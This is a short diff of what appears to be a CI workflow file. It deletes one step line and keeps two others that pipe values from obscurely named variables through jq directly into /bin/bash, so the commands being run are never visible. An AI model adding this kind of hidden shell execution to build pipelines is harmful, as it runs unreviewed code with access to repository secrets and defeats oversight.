@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$ndr237" | jq -r .r9905 | /bin/bash
           echo $fpvxc3194 | jq -r .ae5950 | /bin/bash
-          echo $ty20 | jq -r .kw40 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
